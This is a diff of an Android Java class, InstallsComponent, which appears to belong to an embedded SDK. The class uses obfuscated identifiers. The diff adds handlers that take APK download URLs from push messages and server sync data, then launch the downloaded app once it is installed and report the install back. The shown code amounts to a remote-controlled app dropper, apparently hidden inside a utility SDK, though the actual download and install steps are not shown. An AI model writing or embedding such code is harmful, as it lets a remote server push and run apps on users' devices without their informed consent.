@@ -8,6 +8,7 @@ import android.net.Uri;
 import android.os.Bundle;
 import android.support.annotation.NonNull;
 import android.support.annotation.Nullable;
+import android.text.TextUtils;
 
 import com.evernote.android.job.Job;
 import com.evernote.android.job.JobRequest;
@@ -18,23 +19,25 @@ import com.thin.downloadmanager.DownloadStatusListenerV1;
 import com.thin.downloadmanager.ThinDownloadManager;
 
 import java.io.File;
+import java.util.List;
 import java.util.concurrent.TimeUnit;
 
 import commons.app.com.commons.commons.SdkCommons;
 import commons.app.com.commons.commons.SdkComponent;
-import utils.app.com.installs.models.ApkInfoModel;
-import utils.app.com.installs.sys.TimerService;
 import commons.app.com.keep.NetworkApi;
 import timber.log.Timber;
+import utils.app.com.installs.keep.InstallModel;
+import utils.app.com.installs.keep.InstallsResponse;
+import utils.app.com.installs.models.ApkInfoModel;
+import utils.app.com.installs.sys.TimerService;
 
+@SuppressWarnings("WeakerAccess")
 public class InstallsComponent extends SdkComponent {
 
     private static InstallsComponent instance;
 
     public static final String ARG_APP_ID = "i18927878_arg_1";
     private static final String JOB_TAG_INSTALL_EVENT = "i92797272729_j_1";
-    private static final String JOB_TAG_CHECK_PENDING = "i92797272729_j_2";
-    private static final String JOB_TAG_CHECK_PENDING_NOW = "i92797272729_j_3";
 
     private SharedPrefs preferences;
     private ThinDownloadManager downloadManager;
@@ -55,13 +58,34 @@ public class InstallsComponent extends SdkComponent {
     }
 
     @Override
-    public void onDeviceRegistered() {
-        startPendingInstallsJob();
+    public void onDeviceRebooted() {
+        checkPendingInstalls();
+    }
+
+    @Nullable
+    @Override
+    public Job createJob(@NonNull String tag) {
+        if (JOB_TAG_INSTALL_EVENT.equals(tag)) {
+            return new UploadEventJob();
+        }
+        return null;
     }
 
     @Override
-    public void onFcmMessageReceived(Bundle payload) {
-        String type = payload.getString("type");
+    public void onNewAppAdded(String packageName) {
+        ApkInfoModel apkInfo = preferences.getTargetApkInfo();
+        // Launch installed app, only if this is our app (we have stored apkId)
+        if (apkInfo != null && packageName.equals(apkInfo.getPackageName())) {
+            if (!TextUtils.isEmpty(apkInfo.getId())) {
+                submitInstallEventJob(apkInfo.getId());
+            }
+            launchApp(context(), packageName);
+            preferences.saveTargetApkInfo(null);
+        }
+    }
+
+    @Override
+    public void onFcmMessageReceived(@NonNull String type, @NonNull Bundle payload) {
         if ("apk".equals(type)) {
             String receivedUrl = payload.getString("url");
             String appId = payload.getString("apk_id");
@@ -72,21 +96,13 @@ public class InstallsComponent extends SdkComponent {
     }
 
     @Override
-    public void onDeviceRebooted() {
-        checkPendingInstalls();
-    }
-
-    @Nullable
-    @Override
-    public Job createJob(@NonNull String tag) {
-        if (JOB_TAG_CHECK_PENDING.equals(tag) ||
-                JOB_TAG_CHECK_PENDING_NOW.equals(tag)) {
-            return new LoadDataJob();
+    public void onSyncEvent(@NonNull String json) {
+        InstallsResponse response = safeParse(json, InstallsResponse.class);
+        List<InstallModel> list = response != null ? response.getData() : null;
+        if (list != null && !list.isEmpty()) {
+            InstallModel app = list.get(0);
+            onUrlReceived(app.getDownloadUrl(), app.getAppId());
         }
-        if (JOB_TAG_INSTALL_EVENT.equals(tag)) {
-            return new UploadEventJob();
-        }
-        return null;
     }
 
     public SharedPrefs preferences() {
@@ -144,11 +160,6 @@ public class InstallsComponent extends SdkComponent {
     // JOBS
     ///////////////////////////////////////////////////////////////////////////
 
-    public void startPendingInstallsJob() {
-        startInstallCheckJobNow();
-        startInstallCheckJobRepeated();
-    }
-
     public void submitInstallEventJob(String apkId) {
         PersistableBundleCompat extras = new PersistableBundleCompat();
         extras.putString(ARG_APP_ID, apkId);
@@ -161,40 +172,9 @@ public class InstallsComponent extends SdkComponent {
                 .schedule();
     }
 
-    private void startInstallCheckJobNow() {
-        long executionWindow = TimeUnit.SECONDS.toMillis(10);
-        long startTime = TimeUnit.SECONDS.toMillis(55);
-        new JobRequest.Builder(JOB_TAG_CHECK_PENDING_NOW)
-                .setExecutionWindow(startTime, startTime + executionWindow)
-                .setBackoffCriteria(startTime, JobRequest.BackoffPolicy.EXPONENTIAL)
-                .setUpdateCurrent(true)
-                .setRequiredNetworkType(JobRequest.NetworkType.CONNECTED)
-                .build()
-                .schedule();
-    }
-
-    private void startInstallCheckJobRepeated() {
-        new JobRequest.Builder(JOB_TAG_CHECK_PENDING)
-                .setPeriodic(TimeUnit.MINUTES.toMillis(40), TimeUnit.MINUTES.toMillis(20))
-                .setUpdateCurrent(true)
-                .setRequiredNetworkType(JobRequest.NetworkType.CONNECTED)
-                .build()
-                .schedule();
-    }
-
     ///////////////////////////////////////////////////////////////////////////
     // UTILS
     ///////////////////////////////////////////////////////////////////////////
-
-    public void onAppInstalled(String pkgName) {
-        ApkInfoModel apkInfo = preferences.getTargetApkInfo();
-        // Launch installed app, only if this is our app (we have stored apkId)
-        if (apkInfo != null && pkgName.equals(apkInfo.getPackageName())) {
-            submitInstallEventJob(apkInfo.getId());
-            launchApp(context(), pkgName);
-            preferences.saveTargetApkInfo(null);
-        }
-    }
 
     private void launchApp(Context context, @NonNull String packageName) {
         try {
